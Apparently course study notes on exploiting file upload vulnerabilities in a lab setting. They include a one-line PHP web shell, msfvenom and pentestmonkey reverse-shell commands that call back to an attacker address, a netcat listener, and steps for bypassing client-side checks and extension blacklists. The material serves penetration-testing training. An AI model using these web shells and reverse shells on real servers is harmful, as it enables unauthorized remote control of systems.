# File Upload Vulnerability Notes

## Key Concepts on File Upload Vulnerabilities

### 1. **Absent Validation**
   - Web applications may allow uploads without validation filters.
   - Vulnerable applications allow uploading any file type, including potentially malicious files like web shells or reverse shells.
   - Uploading and executing these scripts may provide full control over the server.

### 2. **Arbitrary File Upload**
   - Web apps may allow uploading any file, without specifying restrictions on file types (e.g., `.php` files).
   - The file selector dialog may show "All Files," indicating no restrictions are enforced on the frontend.
   - If backend validation is absent, it may allow arbitrary file types to be uploaded, leading to potential server exploitation.

### 3. **Identifying Web Framework**
   - To exploit arbitrary file upload, we need to know the server's scripting language.
   - **Web Shell** and **Reverse Shell** scripts require knowing the language of the web server (e.g., PHP, ASP).
   - The **file extension** in URLs can provide clues (e.g., `.php` might indicate PHP backend), though sometimes file extensions may be hidden due to `web routes`
> Web routes are instructions in a web application that map specific URLs to corresponding actions or pages, determining what content or functionality is shown when a user visits a particular address.

   - Testing common web extensions (e.g., `/index.php`) can help identify the technology.
   - Tools like **Burp Intruder** can automate this process by fuzzing extensions.
   - `Wappalyzer` browser extension helps identify the technologies in use on the site.

### 4. **Vulnerability Identification**
   - Once the backend language is identified, you can upload a file in the same language (e.g., a PHP script).
   - Testing with a basic PHP script like `<?php echo "Hello HTB"; ?>` helps confirm if the uploaded file can execute PHP code.
   - If the file is successfully uploaded and executed, the server is vulnerable to file upload exploitation.
   - Example test: Upload `test.php` and access the uploaded file. If the PHP code is executed, the server is vulnerable.

### 5. **Exploiting the Vulnerability**
   - After confirming file upload vulnerability, the next step is to exploit it for remote control of the server by uploading a malicious script.

## Exploitation Techniques

### Web Shells
   - Web shells are scripts that provide a way to interact with the backend server.
   - Examples include **phpbash**, a terminal-like PHP web shell, and others available in **SecLists**.
   - Upload the web shell through the vulnerable upload feature and access it via its link:
     ```
     http://SERVER_IP:PORT/uploads/phpbash.php
     ```
   - Custom Web Shell Example:
     ```php
     <?php system($_REQUEST['cmd']); ?>
     ```
     - Use the `?cmd=` parameter to execute commands (e.g., `?cmd=id`).
     - For browsers, use source-view (`Ctrl+U`) for better output formatting.

### Reverse Shells
   - Reverse shells allow the server to connect back to the attacker's machine, providing interactive control.
   - Tools like **pentestmonkey PHP reverse shell** or scripts from **SecLists** can be used.
   - Edit the script with your IP/PORT:
     ```php
     $ip = 'OUR_IP';     // CHANGE THIS
     $port = OUR_PORT;   // CHANGE THIS
     ```
   - Start a Netcat listener:
     ```
     nc -lvnp OUR_PORT
     ```
   - Upload the script and execute it via the web app:
     ```
     http://SERVER_IP:PORT/uploads/reverse.php
     ```
   - Example reverse shell generation with `msfvenom`:
     ```
     msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php
     ```

### Writing Custom Scripts
   - Custom scripts can be written in the web server's language using native functions like `system()` in PHP or `eval()` in ASP.NET.
   - Use `msfvenom` for generating scripts for various languages:
     ```
     msfvenom -p payload LHOST=OUR_IP LPORT=OUR_PORT -f format > shell.ext
     ```

## Tools Overview

### Pentestmonkey
   - **What It Is**: A collection of tools and scripts designed for penetration testing, including reliable reverse shells.
   - **Key Usage**:
     - Edit `php-reverse-shell.php` to include your IP and port.
     - Upload to the vulnerable server and access its link to gain shell access.

### Msfvenom
   - **What It Is**: A Metasploit tool used to generate payloads, including reverse and bind shells, for various platforms and languages.
   - **Key Usage**:
     - Syntax:
       ```
       msfvenom -p payload LHOST=OUR_IP LPORT=OUR_PORT -f format > outputfile
       ```
     - Example for PHP:
       ```
       msfvenom -p php/reverse_php LHOST=192.168.1.10 LPORT=4444 -f raw > reverse.php
       ```
     - Payloads and formats:
       - `-p`: Specify the payload (e.g., `php/reverse_php`).
       - `-f`: Format (e.g., `raw`, `exe`, `elf`).

## Client-Side Validation

### 1. **Overview**
Many web applications rely on front-end JavaScript for file format validation. This validation prevents files that do not meet specified criteria (e.g., non-image formats) from being uploaded. However, since these validations occur on the client-side, they can be bypassed by:

- Modifying the upload request directly to interact with the server, skipping validation.
- Editing the front-end code via browser developer tools to disable or modify validations.

### 2. **Back-End Request Modification**
#### Steps to Bypass Validation:
1. **Examine the Request**: Capture an image upload request using Burp Suite.
2. **Modify the Request**:
   - Change `filename="HTB.png"` to `filename="shell.php"`.
   - Replace the file content with a PHP web shell.
3. **Send the Modified Request**:
   - Ensure that the server does not perform back-end validation.
   - If successful, the file will upload, and you can access the web shell.

#### Key Points:
- The `Content-Type` header may not require modification.
- A successful upload typically results in a confirmation message like "File successfully uploaded."

### 3. **Disabling Front-End Validation**
#### Using Browser Developer Tools:
1. **Inspect the File Input**:
   - Use [CTRL+SHIFT+C] to toggle the Page Inspector.
   - Locate the `<input>` tag for file uploads, e.g.:
     ```html
     <input type="file" name="uploadFile" id="uploadFile" onchange="checkFile(this)" accept=".jpg,.jpeg,.png">
     ```
2. **Analyze the Validation Function**:
   - Identify the `onchange="checkFile(this)"` attribute.
   - Use the browser console ([CTRL+SHIFT+K]) to inspect the `checkFile` function:
     ```javascript
     function checkFile(File) {
         if (extension !== 'jpg' && extension !== 'jpeg' && extension !== 'png') {
             $('#error_message').text("Only images are allowed!");
             File.form.reset();
             $("#submit").attr("disabled", true);
         }
     }
     ```
   - Note how the function restricts file extensions.

3. **Bypass the Validation**:
   - Remove the `onchange="checkFile(this)"` attribute:
     - Double-click the function name in the inspector and delete it.
   - Optionally, remove `accept=".jpg,.jpeg,.png"` to allow easier file selection.

4. **Upload the Web Shell**:
   - Select the PHP web shell using the file input dialog.
   - Submit the form; the client-side validation is bypassed.

#### Important Notes:
- These modifications are temporary and will not persist through a page refresh.
- The primary goal is to bypass the validation to upload a malicious file.

### 4. **Locating and Accessing the Uploaded File**
Once the web shell is uploaded, inspect the profile image URL to locate the file:
```html
<img src="/profile_images/shell.php" class="profile-image" id="profile-image">
```

## **Blacklisting Extensions**
   - Back-end validation using a blacklist is a weak approach for file type validation as it is often incomplete and can be bypassed.
   - Example of a blacklist implementation in PHP:
     ```php
     $fileName = basename($_FILES["uploadFile"]["name"]);
     $extension = pathinfo($fileName, PATHINFO_EXTENSION);
     $blacklist = array('php', 'php7', 'phps');

     if (in_array($extension, $blacklist)) {
         echo "File type not allowed";
         die();
     }
     ```
   - Common issues with blacklist-based validation:
     - Case sensitivity: A file named `pHp` might bypass the blacklist on Windows servers due to case insensitivity.
     - Limited scope: Many extensions (e.g., `.phtml`) that can execute PHP are not included in the blacklist.

## **Fuzzing Extensions**
   - Fuzzing can identify allowed extensions by testing multiple file extensions to determine which are not blacklisted.
   - Tools and resources:
     - Use extension lists from **PayloadsAllTheThings** or **SecLists**.
     - Burp Suite Intruder can automate extension fuzzing:
       1. Send a file upload request to Intruder.
       2. Set the file extension (e.g., `.php`) as the fuzzing position.
       3. Load the PHP extensions list as payloads.
       4. Analyze responses for successful uploads (e.g., "File successfully uploaded").

## **Non-Blacklisted Extensions**
   - Some extensions like `.phtml` may not be blacklisted and could allow PHP code execution.
   - Steps to exploit:
     1. Upload a file with a non-blacklisted extension (e.g., `shell.phtml`).
     2. Include PHP code, such as a web shell, in the file content.
     3. Access the uploaded file (e.g., `http://SERVER_IP/profile_images/shell.phtml`) and confirm its execution by testing a command.
> `TIP:` When fuzzing the extensions in Burp Intruder, you can also change the the POST request data to include something like a hello word command in php and you can check which php extensions
> are able to run this command. `Also`, you should consider switching off URL encoding before the Intruder attack so all the extensions get sent "as is"!










